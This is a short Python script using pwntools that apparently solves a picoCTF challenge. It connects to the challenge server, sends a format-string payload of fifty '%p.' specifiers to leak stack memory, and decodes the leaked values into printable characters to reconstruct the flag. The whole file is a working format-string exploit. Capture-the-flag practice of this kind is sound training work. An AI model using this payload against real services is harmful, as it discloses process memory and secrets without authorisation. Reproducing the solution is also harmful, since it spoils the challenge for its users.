from pwn import *

HOST = 'mimas.picoctf.net'  
PORT = 60635                

context.log_level = 'error'

io = remote(HOST, PORT)

payload = b'%p.' * 50

io.sendlineafter(b"you:\n", payload)

io.recvuntil(b"order: ")
response = io.recvline().decode().strip()

print("[*] Memori server:")
print(response)
print("-" * 50)

print("[*] (decode) Flag...\n")
flag = ""

for leak in response.split('.'):
    if leak == '(nil)' or leak == '':
        continue
        
    try:
        if leak.startswith('0x'):
            leak = leak[2:]

        val = int(leak, 16)
        
        decoded_bytes = p64(val)
        
        for b in decoded_bytes:
            if 32 <= b <= 126: 
                flag += chr(b)
    except Exception:
        continue

print("[*] Flag:")
print(flag)
